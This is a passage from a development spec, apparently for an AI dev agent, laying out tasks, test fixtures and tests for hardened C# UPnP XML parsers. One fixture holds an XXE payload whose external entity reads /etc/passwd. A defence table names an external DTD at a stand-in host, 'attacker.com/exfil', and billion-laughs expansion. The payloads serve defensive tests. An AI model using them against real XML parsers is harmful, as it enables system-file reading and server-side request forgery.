                  rootSink.AddRange(embedded.Services);
              }
          }
      }
  }
  ```
- [x] **6.3** **Synchronous `Parse(byte[])` API** — device descriptions are small; `IDeviceDescriptionParser.Parse` returns the parsed `DeviceDescription` directly. No `Task<>`, no incremental yield. Consumers don't need to `await` it.
- [x] **6.4** **Sync XmlReader usage on an async-capable settings** — `XmlReaderSettings.Async = true` is a *capability* flag; you can still call sync `Read()` on the resulting reader. The sync API is fine here; the parser's caller (Story 2.3 `EagerDescriptionDispatcher`) can run the parse on a thread-pool thread via `Task.Run` if it ever profiles as a hotspot (unlikely for 20 KB documents).
- [x] **6.5** **FR-053 enforcement** is in `ReadEmbeddedDeviceList` — recursive walk, all services flow into the SAME root sink. Embedded-device metadata (`<friendlyName>`, etc.) is constructed-then-discarded; only the service list survives.
- [x] **6.6** **Empty-string defaults for required fields** (`friendlyName`, `deviceType`, `udn`, `manufacturer`, `modelName`) — if the XML omits these, the parser produces `""`. AC-9 doesn't require validation; the caller (Story 2.3) decides whether an empty `Udn` is a fail-fast condition. (Story 1.4 is just an extractor; semantic validation is the consumer's concern.)

### Task 7 — DI wiring (App/Composition) (AC: #1, #9)

- [x] **7.1** **Read** `src/ohSpy.App/Composition/ServiceRegistration.cs` first (Stories 1.2 + 1.3 added registrations; preserve their content).
- [x] **7.2** Append to the existing method body:
  ```csharp
  // Story 1.4 — XML parsers (Decision 5). Stateless across documents; singleton fine.
  services.AddSingleton<IScpdParser, XmlReaderScpdParser>();
  services.AddSingleton<IDeviceDescriptionParser, DeviceDescriptionParser>();
  ```
- [x] **7.3** Add the using if not already present:
  ```csharp
  using ohSpy.Core.Scpd;
  ```
- [x] **7.4** **Verify `InternalsVisibleTo` for `ohSpy.App` is still in place.** `XmlReaderScpdParser` and `DeviceDescriptionParser` are `internal sealed`; the App needs the grant to see them for DI registration. Story 1.3 added BOTH `<InternalsVisibleTo Include="ohSpy.Core.Tests" />` AND `<InternalsVisibleTo Include="ohSpy.App" />` to `src/ohSpy.Core/ohSpy.Core.csproj` (verified at story-authoring time). Read the file and confirm both are present. **If the App grant has been reverted**, re-add it inside the existing `InternalsVisibleTo` `<ItemGroup>`:
  ```xml
  <ItemGroup>
    <InternalsVisibleTo Include="ohSpy.Core.Tests" />
    <InternalsVisibleTo Include="ohSpy.App" />
  </ItemGroup>
  ```
  Without the App grant, the DI registrations in Task 7.2 fail CS0122 at compile time.

### Task 8 — Author test fixtures (Tests/Fixtures) (AC: #4, #5, #6, #8, #9)

- [x] **8.1** Create folder `tests/ohSpy.Core.Tests/Fixtures/Scpds/` and `tests/ohSpy.Core.Tests/Fixtures/DeviceDescriptions/`.

- [x] **8.2** **`tests/ohSpy.Core.Tests/Fixtures/Scpds/linn-ds-5action.xml`** — small canonical SCPD (Linn DS shape). Skeleton:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <scpd xmlns="urn:schemas-upnp-org:service-1-0">
    <specVersion><major>1</major><minor>0</minor></specVersion>
    <actionList>
      <action>
        <name>GetMute</name>
        <argumentList>
          <argument><name>Channel</name><direction>in</direction><relatedStateVariable>A_ARG_TYPE_Channel</relatedStateVariable></argument>
          <argument><name>CurrentMute</name><direction>out</direction><relatedStateVariable>Mute</relatedStateVariable></argument>
        </argumentList>
      </action>
      <action>
        <name>SetMute</name>
        <argumentList>
          <argument><name>Channel</name><direction>in</direction><relatedStateVariable>A_ARG_TYPE_Channel</relatedStateVariable></argument>
          <argument><name>DesiredMute</name><direction>in</direction><relatedStateVariable>Mute</relatedStateVariable></argument>
        </argumentList>
      </action>
      <action><name>GetVolume</name><argumentList>
        <argument><name>CurrentVolume</name><direction>out</direction><relatedStateVariable>Volume</relatedStateVariable></argument>
      </argumentList></action>
      <action><name>SetVolume</name><argumentList>
        <argument><name>DesiredVolume</name><direction>in</direction><relatedStateVariable>Volume</relatedStateVariable></argument>
      </argumentList></action>
      <action><name>VolumeInc</name><argumentList/></action>
    </actionList>
    <serviceStateTable>
      <stateVariable sendEvents="yes"><name>Mute</name><dataType>boolean</dataType><defaultValue>0</defaultValue></stateVariable>
      <stateVariable sendEvents="yes"><name>Volume</name><dataType>ui4</dataType><defaultValue>50</defaultValue>
        <allowedValueRange><minimum>0</minimum><maximum>100</maximum></allowedValueRange>
      </stateVariable>
      <stateVariable sendEvents="no"><name>A_ARG_TYPE_Channel</name><dataType>string</dataType>
        <allowedValueList>
          <allowedValue>Master</allowedValue>
          <allowedValue>LF</allowedValue>
          <allowedValue>RF</allowedValue>
        </allowedValueList>
      </stateVariable>
    </serviceStateTable>
  </scpd>
  ```

- [x] **8.3** **`tests/ohSpy.Core.Tests/Fixtures/Scpds/igd-router-200action.xml`** — large synthetic SCPD with 200 actions for AC-4 perf test. **Generate programmatically** in a setup test or build step rather than hand-authoring:
  ```csharp
  // Or generate at test-class init via:
  private static byte[] BuildLargeScpd(int actionCount)
  {
      var sb = new System.Text.StringBuilder();
      sb.AppendLine("""<?xml version="1.0" encoding="UTF-8"?>""");
      sb.AppendLine("""<scpd xmlns="urn:schemas-upnp-org:service-1-0">""");
      sb.AppendLine("  <specVersion><major>1</major><minor>0</minor></specVersion>");
      sb.AppendLine("  <actionList>");
      for (int i = 0; i < actionCount; i++)
      {
          sb.Append("    <action><name>Action").Append(i).AppendLine("</name>");
          sb.AppendLine("      <argumentList>");
          sb.Append("        <argument><name>In").Append(i).AppendLine("</name><direction>in</direction><relatedStateVariable>VarA</relatedStateVariable></argument>");
          sb.Append("        <argument><name>Out").Append(i).AppendLine("</name><direction>out</direction><relatedStateVariable>VarB</relatedStateVariable></argument>");
          sb.AppendLine("      </argumentList>");
          sb.AppendLine("    </action>");
      }
      sb.AppendLine("  </actionList>");
      sb.AppendLine("  <serviceStateTable>");
      sb.AppendLine("    <stateVariable><name>VarA</name><dataType>string</dataType></stateVariable>");
      sb.AppendLine("    <stateVariable><name>VarB</name><dataType>string</dataType></stateVariable>");
      sb.AppendLine("  </serviceStateTable>");
      sb.AppendLine("</scpd>");
      return System.Text.Encoding.UTF8.GetBytes(sb.ToString());
  }
  ```
  This avoids checking a 200KB+ XML file into the repo. The fixture file path can be kept as an empty placeholder OR the test class can use the generated bytes directly.

- [x] **8.4** **`tests/ohSpy.Core.Tests/Fixtures/Scpds/malformed-mid-document.xml`** — first 2 actions valid; third action has a missing closing tag:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <scpd xmlns="urn:schemas-upnp-org:service-1-0">
    <specVersion><major>1</major><minor>0</minor></specVersion>
    <actionList>
      <action><name>Action0</name><argumentList/></action>
      <action><name>Action1</name><argumentList/></action>
      <action><name>Action2<argumentList/></action>  <!-- unterminated <name> -->
    </actionList>
  </scpd>
  ```
  > **Where the exception actually fires:** XmlReader processes `<name>Action2` as opening the `<name>` element with text content `"Action2"`, then sees `<argumentList/>` which it treats as a child element (text + element content mixed). When `ReadElementContentAsStringAsync` is invoked to read `<name>`'s content (in `ReadActionAsync`'s `case "name":` branch), it throws `XmlException` ("text-content reader encountered Element node") OR XmlReader throws later at the unmatched `</action>` end-tag. Either way the failure site is inside `ReadActionAsync`, NOT in `ReadAsyncSafe`. **This is why Task 5.1's `StreamActionsAsync` needs the outer try/catch around `TryReadNextActionAsync` (already in the corrected skeleton)** — `ReadAsyncSafe` alone does not cover `ReadElementContentAsStringAsync`. The test contract holds: Action0 and Action1 yield successfully, then the 3rd iteration throws `UpnpProtocolException` (the outer try/catch converts the inner `XmlException`).

- [x] **8.5** **`tests/ohSpy.Core.Tests/Fixtures/Scpds/xxe-attempt.xml`** — DTD with external entity. The XmlReader MUST reject this before any entity resolution attempt:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE scpd [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <scpd xmlns="urn:schemas-upnp-org:service-1-0">
    <specVersion><major>1</major><minor>0</minor></specVersion>
    <actionList>
      <action><name>Stolen&xxe;</name><argumentList/></action>
    </actionList>
  </scpd>
  ```
  Per AC-6: `DtdProcessing=Prohibit` throws `XmlException` at the `<!DOCTYPE>` line — the entity is never resolved, the filesystem is never touched, the parser wraps to `UpnpProtocolException`.

- [x] **8.6** **`tests/ohSpy.Core.Tests/Fixtures/Scpds/state-table-rich.xml`** — covers AC-8: `<allowedValueList>`, `<allowedValueRange>` (with AND without `<step>`), `<defaultValue>`:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <scpd xmlns="urn:schemas-upnp-org:service-1-0">
    <specVersion><major>1</major><minor>0</minor></specVersion>
    <actionList/>
    <serviceStateTable>
      <stateVariable>
        <name>Mute</name><dataType>boolean</dataType><defaultValue>0</defaultValue>
      </stateVariable>
      <stateVariable>
        <name>Volume</name><dataType>ui4</dataType><defaultValue>50</defaultValue>
        <allowedValueRange><minimum>0</minimum><maximum>100</maximum><step>1</step></allowedValueRange>
      </stateVariable>
      <stateVariable>
        <name>Balance</name><dataType>i4</dataType>
        <allowedValueRange><minimum>-15</minimum><maximum>15</maximum></allowedValueRange>  <!-- no step → null -->
      </stateVariable>
      <stateVariable>
        <name>Mode</name><dataType>string</dataType><defaultValue>Stereo</defaultValue>
        <allowedValueList>
          <allowedValue>Stereo</allowedValue>
          <allowedValue>Mono</allowedValue>
          <allowedValue>Surround</allowedValue>
        </allowedValueList>
      </stateVariable>
    </serviceStateTable>
  </scpd>
  ```

- [x] **8.7** **`tests/ohSpy.Core.Tests/Fixtures/DeviceDescriptions/linn-ds.xml`** — simple single-device description (no embedded children):
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <root xmlns="urn:schemas-upnp-org:device-1-0">
    <specVersion><major>1</major><minor>0</minor></specVersion>
    <device>
      <deviceType>urn:linn-co-uk:device:Source:1</deviceType>
      <friendlyName>Living Room DS</friendlyName>
      <manufacturer>Linn Products</manufacturer>
      <manufacturerURL>http://www.linn.co.uk</manufacturerURL>
      <modelDescription>Linn Klimax DS</modelDescription>
      <modelName>Klimax DS</modelName>
      <modelNumber>3.0</modelNumber>
      <modelURL>http://www.linn.co.uk/klimax-ds</modelURL>
      <serialNumber>123456</serialNumber>
      <UDN>uuid:4c494e4e-0000-0000-0000-000000000001</UDN>
      <UPC>0123456789012</UPC>
      <presentationURL>http://192.168.1.100/</presentationURL>
      <serviceList>
        <service>
          <serviceType>urn:linn-co-uk:service:Volkano:1</serviceType>
          <serviceId>urn:linn-co-uk:serviceId:Volkano</serviceId>
          <SCPDURL>/Volkano/Scpd.xml</SCPDURL>
          <controlURL>/Volkano/control</controlURL>
          <eventSubURL>/Volkano/event</eventSubURL>
        </service>
      </serviceList>
    </device>
  </root>
  ```

- [x] **8.8** **`tests/ohSpy.Core.Tests/Fixtures/DeviceDescriptions/igd-with-embedded.xml`** — exercises FR-053 flattening. Root device with `<deviceList>` containing two embedded devices, each with its own `<serviceList>`:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <root xmlns="urn:schemas-upnp-org:device-1-0">
    <specVersion><major>1</major><minor>0</minor></specVersion>
    <device>
      <deviceType>urn:schemas-upnp-org:device:InternetGatewayDevice:1</deviceType>
      <friendlyName>Home Router</friendlyName>
      <manufacturer>Netgear</manufacturer>
      <modelName>R7000</modelName>
      <UDN>uuid:igd-root-0000-0000-000000000001</UDN>
      <serviceList>
        <service>
          <serviceType>urn:schemas-upnp-org:service:Layer3Forwarding:1</serviceType>
          <serviceId>urn:upnp-org:serviceId:Layer3Forwarding</serviceId>
          <SCPDURL>/L3F/scpd.xml</SCPDURL>
          <controlURL>/L3F/control</controlURL>
          <eventSubURL>/L3F/event</eventSubURL>
        </service>
      </serviceList>
      <deviceList>
        <device>
          <deviceType>urn:schemas-upnp-org:device:WANDevice:1</deviceType>
          <friendlyName>WAN Device</friendlyName>
          <manufacturer>Netgear</manufacturer>
          <modelName>R7000-WAN</modelName>
          <UDN>uuid:igd-wan-0000-0000-000000000002</UDN>
          <serviceList>
            <service>
              <serviceType>urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1</serviceType>
              <serviceId>urn:upnp-org:serviceId:WANCommonIFC1</serviceId>
              <SCPDURL>/WANCIC/scpd.xml</SCPDURL>
              <controlURL>/WANCIC/control</controlURL>
              <eventSubURL>/WANCIC/event</eventSubURL>
            </service>
          </serviceList>
          <deviceList>
            <device>
              <deviceType>urn:schemas-upnp-org:device:WANConnectionDevice:1</deviceType>
              <friendlyName>WAN Connection Device</friendlyName>
              <UDN>uuid:igd-wan-conn-0000-000000000003</UDN>
              <serviceList>
                <service>
                  <serviceType>urn:schemas-upnp-org:service:WANIPConnection:1</serviceType>
                  <serviceId>urn:upnp-org:serviceId:WANIPConn1</serviceId>
                  <SCPDURL>/WANIPC/scpd.xml</SCPDURL>
                  <controlURL>/WANIPC/control</controlURL>
                  <eventSubURL>/WANIPC/event</eventSubURL>
                </service>
              </serviceList>
            </device>
          </deviceList>
        </device>
      </deviceList>
    </device>
  </root>
  ```
  Expected parsed result: ROOT device's `Services` list has **3 services** (Layer3Forwarding + WANCommonInterfaceConfig + WANIPConnection — flattened depth-first from the recursive deviceList walk). The 3 embedded `<friendlyName>` / `<manufacturer>` values are NOT preserved (per FR-053; embedded metadata discarded).

- [x] **8.9** **`tests/ohSpy.Core.Tests/Fixtures/DeviceDescriptions/minimal.xml`** — strips all optional fields to verify nullable handling:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <root xmlns="urn:schemas-upnp-org:device-1-0">
    <device>
      <deviceType>urn:test:device:Minimal:1</deviceType>
      <friendlyName>Minimal</friendlyName>
      <manufacturer>Test</manufacturer>
      <modelName>Min</modelName>
      <UDN>uuid:minimal-0000-0000-0000-000000000001</UDN>
      <serviceList/>
    </device>
  </root>
  ```
  Expected parsed result: all nullable fields (`PresentationUrl`, `ManufacturerUrl`, `ModelNumber`, `ModelDescription`, `ModelUrl`, `SerialNumber`, `Upc`) are `null`. `Services` is an empty list.

- [x] **8.10** **MSBuild — copy fixtures to test output directory.** Add to `tests/ohSpy.Core.Tests/ohSpy.Core.Tests.csproj`:
  ```xml
  <ItemGroup>
    <None Update="Fixtures\**\*.xml">
      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
    </None>
  </ItemGroup>
  ```
  Tests load via `File.OpenRead(Path.Combine(AppContext.BaseDirectory, "Fixtures", "Scpds", "linn-ds-5action.xml"))` or equivalent. **Verify the files actually end up in `bin/Debug/net10.0/Fixtures/...`** after build — if not, the path glob is wrong.

### Task 9 — Author SCPD parser tests (Tests/Scpd) (AC: #4, #5, #6, #7, #8)

- [x] **9.1** Create folder `tests/ohSpy.Core.Tests/Scpd/`.
- [x] **9.2** Create `tests/ohSpy.Core.Tests/Scpd/XmlReaderScpdParserTests.cs`. Use xUnit + FluentAssertions. Trait AC-mapped tests with `[Trait("ac", "AC-5.x")]` (Amendment A2 pattern).

- [x] **9.3** Required tests:
  1. **`StreamActions_Happy_YieldsAllInOrder`** `[Trait("ac", "AC-5.1")]`. Parse `linn-ds-5action.xml`. Assert: 5 actions, names in source order `[GetMute, SetMute, GetVolume, SetVolume, VolumeInc]`, argument counts match expected.
  2. **`StreamActions_LargeScpd_StreamsIncrementally`** `[Trait("ac", "AC-5.1")]`. Parse a 200-action generated SCPD (Task 8.3). Use `await foreach` with a `Stopwatch` per iteration; assert MAX per-iteration time < 50 ms (generous over the 16 ms spec budget — xUnit runners on CI are noisy). Assert total parse < 2 s. Assert all 200 actions yielded.
  3. **`StreamActions_MalformedMidDocument_YieldsValidThenThrows`** `[Trait("ac", "AC-5.2")]`. Parse `malformed-mid-document.xml`. Collect actions into a list via `await foreach`; expect first 2 added, then `UpnpProtocolException` thrown on the next iteration. Assert list count == 2; assert the first 2 names match.
  4. **`StreamActions_XxeAttempt_ThrowsUpnpProtocolException`** `[Trait("ac", "AC-5.3")]`. Parse `xxe-attempt.xml`. Assert `UpnpProtocolException` thrown immediately on first iteration. Assert no `/etc/passwd` access attempted (manual: the file doesn't exist on Windows; XmlException at the `<!DOCTYPE>` line proves no resolution).
  5. **`StreamActions_CancellationMidStream_PropagatesOperationCanceledException`** `[Trait("ac", "AC-5.4")]`. Build a CTS with timeout 0 ms. Parse the 200-action SCPD; assert `OperationCanceledException` (or its subtype `TaskCanceledException`) thrown — NOT `UpnpProtocolException`. Verify XmlReader was disposed (best-effort: the `using` syntax guarantees it on throw).
  6. **`ReadStateTable_RichSCPD_BuildsByNameDictionary`** `[Trait("ac", "AC-5.5")]`. Parse `state-table-rich.xml`. Assert: 4 state variables, `ByName["Mute"]` is boolean with DefaultValue "0"; `ByName["Volume"]` has `AllowedValueRange = (0, 100, 1)`; `ByName["Balance"]` has `AllowedValueRange = (-15, 15, null)` (step null); `ByName["Mode"]` has `AllowedValueList = ["Stereo", "Mono", "Surround"]` AND `DefaultValue = "Stereo"`.
  7. **`ReadStateTable_AllowedValueRange_NullStepWhenOmitted`** `[Trait("ac", "AC-5.5")]`. Dedicated test for the `Step is null` clause of AC-8. (Same fixture as test 6 but a focused assertion.)
  8. **`StreamActions_EmptyActionList_YieldsZero`**. Edge case: SCPD with `<actionList/>`. Assert `await foreach` completes with zero items, no exception.
  9. **`StreamActions_ActionWithNoArguments_YieldsActionWithEmptyLists`**. Edge: action with `<argumentList/>`. Assert action emitted with `Inputs.Count == 0` and `Outputs.Count == 0`.
  10. **`StreamActions_DoesNotDisposeCallerStream`**. Pass a `MemoryStream` wrapped in a tracking adapter (or use a subclass that records `Dispose()` calls). After successful parse, assert the underlying stream is **NOT** disposed by the parser. Stream lifetime is the caller's contract.
     > **Contract:** `XmlReaderSettings.CloseInput` defaults to `false` — `XmlReader.Dispose` does NOT close the underlying stream. The parser therefore never disposes the caller's stream. Document this in the `IScpdParser` and `IDeviceDescriptionParser` XML docs ("the parser does not dispose the supplied stream — caller owns lifetime"). Typical consumer pattern: `using var ms = new MemoryStream(bytes); await foreach (...)` — caller's `using` cleans up.

### Task 10 — Author DeviceDescription parser tests (Tests/Scpd) (AC: #9)

- [x] **10.1** Create `tests/ohSpy.Core.Tests/Scpd/DeviceDescriptionParserTests.cs`.

- [x] **10.2** Required tests:
  1. **`Parse_TypicalLinnDs_ExtractsAllMetadata`**. Parse `linn-ds.xml`. Assert every field populated correctly: `FriendlyName == "Living Room DS"`, `Udn == "uuid:4c494e4e-0000-0000-0000-000000000001"`, `Manufacturer == "Linn Products"`, all 12 metadata fields populated, `Services.Count == 1`, the single service has `ServiceType == "urn:linn-co-uk:service:Volkano:1"`.
  2. **`Parse_MinimalDescription_LeavesOptionalFieldsNull`**. Parse `minimal.xml`. Assert `PresentationUrl`, `ManufacturerUrl`, `ModelNumber`, `ModelDescription`, `ModelUrl`, `SerialNumber`, `Upc` are all `null`. Required fields populated. `Services` is empty.
  3. **`Parse_IgdWithEmbeddedDevices_FlattensServicesPerFr053`** `[Trait("fr", "FR-053")]`. Parse `igd-with-embedded.xml`. Assert: root device's `Udn == "uuid:igd-root-0000-0000-000000000001"`, root's `FriendlyName == "Home Router"`. CRITICAL: `Services.Count == 3` (Layer3Forwarding + WANCommonInterfaceConfig + WANIPConnection — flattened from root + 2 embedded levels). Assert order matches source-document order. Assert the embedded devices' friendly names do NOT appear anywhere in the parsed result.
  4. **`Parse_XxeAttempt_ThrowsUpnpProtocolException`** `[Trait("ac", "AC-5.3")]`. Build a device description XML with the same DOCTYPE+ENTITY pattern as `xxe-attempt.xml`. Assert `UpnpProtocolException` thrown. (Reuses the XmlReaderSettings discipline test from the SCPD parser.)
  5. **`Parse_NullInput_ThrowsArgumentNullException`**. `parser.Parse(null!)` throws `ArgumentNullException`.
  6. **`Parse_EmptyByteArray_ThrowsUpnpProtocolException`**. `parser.Parse(Array.Empty<byte>())` throws `UpnpProtocolException` (zero-length doc has no `<device>` root).
  7. **`Parse_NoRootDevice_ThrowsUpnpProtocolException`**. XML with `<root>` but no `<device>` child. Assert throw.

### Task 11 — Verification + smoke (AC: all)

- [x] **11.1** Run `dotnet build` from repo root. Must succeed with ZERO warnings.
- [x] **11.2** Run `dotnet test`. Story 1.4 adds ~17 new tests; total goes from 66 → ~83. Paste the final summary line.
- [x] **11.3** Run `dotnet test --filter "category=chaos"`. Still matches 0 (chaos lands in Story 1.6). Exit 0.
- [x] **11.4** Manual smoke: run the App per Story 1.2's launch-profile pattern (`dotnet run --project src/ohSpy.App --launch-profile "ohSpy.App (Unpackaged)"`). Empty WinUI window should still appear; DI graph must resolve `IScpdParser` and `IDeviceDescriptionParser` without throwing.
- [x] **11.5** Make a trivial commit (e.g. README touch). Pre-commit hook fires, exits 0 trivially.

## Dev Notes

### Architectural pillars this story implements

| Architecture decision | What this story delivers | AC tag |
|---|---|---|
| **Decision 5** — XML parser strategy (SCPD streaming + device description) | `IScpdParser` (`IAsyncEnumerable` streaming + state-table sync), `IDeviceDescriptionParser` (sync over byte[]), XmlReader-backed impls with XXE-locked settings | AC-1, AC-3, AC-4, AC-5, AC-6, AC-7, AC-8, AC-9 |
| **Pattern 9** — sealed records for data models | `ScpdAction`, `ScpdArgument`, `ScpdStateTable`, `ScpdStateVariable`, `ScpdAllowedValueRange`, `DeviceDescription`, `ServiceDescription` — all `public sealed record` | AC-2 |
| **FR-100** — incremental SCPD parse | `await Task.Yield()` between each yielded action; no per-iteration cost > 16 ms (test asserts < 50 ms with generous CI headroom) | AC-4 |
| **FR-053** — embedded-device service flattening | `DeviceDescriptionParser.ReadEmbeddedDeviceList` recursively walks `<deviceList>`, all services flow into the ROOT services list | AC-9 |
| **Pattern 2** — Core ↔ App boundary | All Story 1.4 deliverables in `ohSpy.Core/Scpd/` and `ohSpy.Core/Models/` — zero WinUI dependency | (cross-cutting) |
| **Pattern 6** — async discipline | `ConfigureAwait(false)` on every Core await; `[EnumeratorCancellation]` on the `IAsyncEnumerable` token parameter | (referenced) |
| **A5** — UpnpProtocolException | Thrown on parse failures (malformed XML, XXE, etc.) with placeholder Uri `about:blank`; callers wrap with their known URL context | AC-5, AC-6 |

### XXE defence — what `DtdProcessing.Prohibit` + `XmlResolver = null` together prevent

| Attack vector | Without the settings | With the settings |
|---|---|---|
| `<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` followed by `&xxe;` reference | XmlReader fetches `/etc/passwd`, inlines content; exfiltration possible if the parsed content is echoed | `XmlException` raised at the `<!DOCTYPE>` line; entity never defined |
| `<!DOCTYPE x SYSTEM "http://attacker.com/exfil">` (external DTD) | XmlReader fetches the DTD over HTTP; SSRF + timing attacks | `XmlException` at the `<!DOCTYPE>` line |
| `<!ENTITY lol SYSTEM "http://...">` parameter entity | XmlReader fetches over the network | Prohibited |
| Billion-laughs (nested entity expansion) | Memory exhaustion | `MaxCharactersInDocument` bound provides a hard ceiling regardless |

`DtdProcessing.Prohibit` is stricter than `DtdProcessing.Ignore` — the latter just silently drops the DTD; the former raises an exception, which is what we want for diagnostic visibility (the protocol violation is loud, not silent).

### Cross-story dependencies (forward-looking)

| Story | Why it depends on 1.4 |
|---|---|
| 1.5 | No direct dep; runs in parallel. |
| 1.6 | No direct dep; chaos tests exercise `IUpnpHttpClient`, not the parsers. |
| 2.3 | `EagerDescriptionDispatcher.FetchAsync` consumes `IDeviceDescriptionParser.Parse(bytes)` and reads `DeviceDescription.Udn` for the mismatched-root backstop (AC-9.6). |
| 2.6 | Service-node expansion consumes `IScpdParser.StreamActionsAsync` for lazy SCPD parse + appends each yielded `ScpdAction` to the tree via `IUiDispatcher.Post`. |
| 3.1 | SOAP envelope builder consumes `ScpdAction` + `ScpdArgument` shape to construct the request. |
| 3.2 | Invocation popup reads `ScpdAction.Inputs` to render an editable form. |
| 3.3 | Constrained inputs read `ScpdStateTable.ByName[arg.RelatedStateVariable]` to find `AllowedValueList` / `AllowedValueRange`. The lazy `ReadStateTableAsync` fires on first popup open per service. |
| 5.2 | Adapter switch tears down everything including the parser singletons (no — they're stateless, no teardown needed). Reuses across rebinds. |

### Story 1.3 learnings worth carrying forward

[Source: `1-3-upnp-http-client-facade-with-per-request-timeout-discipline.md` §Completion Notes + Code Review, commits `8a6fb44` / `057064f` / `609e08c`]

- **A9/A10/A11 architecture amendments are applied** (commit `609e08c`). Story 1.4 inherits: `Task<byte[]>` from both Fetch methods (A10), corrected `UpnpTransportException` ctor doc (A9 — not relevant here since 1.4 throws `UpnpProtocolException`), test-tree analyzer exemption canonical list (A11).
- **`InternalsVisibleTo` includes BOTH `ohSpy.Core.Tests` AND `ohSpy.App`** (Story 1.3 dev agent extended this beyond the spec). Story 1.4's `internal sealed` impls (`XmlReaderScpdParser`, `DeviceDescriptionParser`) need the App grant for DI to see the concrete types. **Already in place** — no csproj edit needed unless someone reverted it.
- **VSTHRD003 + CA2263 are now in the test-tree `.editorconfig` exemption block** (added by Story 1.3). Story 1.4 inherits these — no new exemptions expected unless `XmlReader`-specific analyzer behaviour requires it.
- **66/66 tests passing after Story 1.3.** Story 1.4 should add ~17 more, target 83.
- **`Microsoft.Extensions.DependencyInjection 10.0.0`** and **`Microsoft.Extensions.Options 10.0.0`** are already pinned + referenced. No new package work for Story 1.4 (XML parsing is BCL-only — `System.Xml.XmlReader` ships in .NET 10).
- **CapturingDiagnosticEmitter from Story 1.3 can be reused** if Story 1.4 ever needs to assert diagnostic emission. Story 1.4's parsers don't emit diagnostics directly (no URL context) — the caller wraps + emits — so this is forward-looking only.
- **launchSettings.json profile gotcha** still applies — `dotnet run` needs `--launch-profile "ohSpy.App (Unpackaged)"`.

### What this story explicitly does NOT do

- **Does NOT emit diagnostics from the parsers themselves.** The parsers throw `UpnpProtocolException` with a placeholder Uri (`about:blank`); callers (Story 2.3 / Story 2.6) catch + re-throw with their real URL context + emit `Scpd.Parse` / `Description.Parse` diagnostics. The parsers stay context-free and reusable.
- **Does NOT consume `IUpnpHttpClient`.** Story 1.4's parsers take a `Stream` (SCPD) or `byte[]` (device description); they don't know where the bytes came from. The HTTP-to-parser bridge is the consumer's responsibility.
- **Does NOT validate semantic correctness.** Empty `Udn`, malformed `serviceType` URN, dangling `RelatedStateVariable` — Story 1.4 extracts them as-is. Validation is the consumer's concern. (Story 2.3's mismatched-root check is the first place such validation happens.)
- **Does NOT construct WinUI VMs.** `ScpdAction` ≠ `ActionNodeViewModel`. Story 2.6 wraps the parsed `ScpdAction` in an `ActionNodeViewModel` for the tree.
- **Does NOT cache parse results.** Each call re-parses the stream. Caching is Story 2.6's concern (it stores the parsed actions on the `ServiceNodeViewModel` so re-expansion is free).
- **Does NOT handle URL resolution.** `ServiceDescription.ScpdUrl`, `ControlUrl`, `EventSubUrl` are stored verbatim — could be relative or absolute. Story 2.6 (and others) resolve against the device's `URLBase` or the description's location URL when making the HTTP call.
- **Does NOT add chaos tests** — that's Story 1.6.
- **Does NOT add NetArchTest rules** — Story 1.6 introduces the test fixture that pins the Core ↔ App boundary.

### Project Structure Notes

**Minimum directories this story must create:**

```
src/ohSpy.Core/
├── Models/                                ← NEW in 1.4
│   ├── ScpdDirection.cs                   ← Task 1.2
│   ├── ScpdArgument.cs                    ← Task 1.3
│   ├── ScpdAction.cs                      ← Task 1.4
│   ├── ScpdAllowedValueRange.cs           ← Task 1.5
│   ├── ScpdStateVariable.cs               ← Task 1.6
│   ├── ScpdStateTable.cs                  ← Task 1.7
│   ├── ServiceDescription.cs              ← Task 2.1
│   └── DeviceDescription.cs               ← Task 2.2
└── Scpd/                                  ← NEW in 1.4
    ├── UpnpXmlReaderSettings.cs           ← Task 3
    ├── IScpdParser.cs                     ← Task 4
    ├── XmlReaderScpdParser.cs             ← Task 5
    ├── IDeviceDescriptionParser.cs        ← Task 6.1
    └── DeviceDescriptionParser.cs         ← Task 6.2

tests/ohSpy.Core.Tests/
├── Scpd/                                  ← NEW in 1.4
│   ├── XmlReaderScpdParserTests.cs        ← Task 9
│   └── DeviceDescriptionParserTests.cs    ← Task 10
└── Fixtures/                              ← NEW in 1.4
    ├── Scpds/                             ← Task 8.2-8.6
    │   ├── linn-ds-5action.xml
    │   ├── malformed-mid-document.xml
    │   ├── xxe-attempt.xml
    │   └── state-table-rich.xml
    │   (igd-router-200action.xml generated in test code per Task 8.3 — no fixture file needed)
    └── DeviceDescriptions/                ← Task 8.7-8.9
        ├── linn-ds.xml
        ├── igd-with-embedded.xml
        └── minimal.xml
```

**Files modified:**
- `src/ohSpy.App/Composition/ServiceRegistration.cs` — append IScpdParser + IDeviceDescriptionParser singleton registrations (Task 7).
- `tests/ohSpy.Core.Tests/ohSpy.Core.Tests.csproj` — add `<None Update="Fixtures\**\*.xml"><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>` ItemGroup (Task 8.10).

### Architecture amendments to anticipate

Story 1.1 → A6/A7/A8, Story 1.3 → A9/A10/A11. Story 1.2 had zero amendments — clean implementation. Story 1.4's surface (XML parsing + records + XmlReader hardening) is well-specified; amendments expected to be few or none. **Candidates the dev agent should flag if encountered:**

- **A12 candidate** — `UpnpProtocolException` parser context. The parser uses a placeholder `about:blank` Uri because it doesn't know the source URL. If consumer code (Stories 2.3 / 2.6) ends up doing a lot of wrap-and-rethrow boilerplate, the architecture could be amended to either (a) add a `Uri sourceUri = null` parameter to the parser methods, or (b) introduce a dedicated `ScpdParseException` type that the caller wraps to `UpnpProtocolException` with their URL. Flag based on consumer experience after Stories 2.3 / 2.6 land.
- **A13 candidate** — `IDeviceDescriptionParser.Parse(byte[])` vs `Parse(Stream)`. Story 1.3's A10 made `FetchDeviceDescriptionAsync` return `byte[]`; the parser signature accepts `byte[]` for symmetry. If a future consumer wants to parse from a non-byte-array source (file, network stream), the signature would need to widen. Defer.

### Anti-patterns to avoid

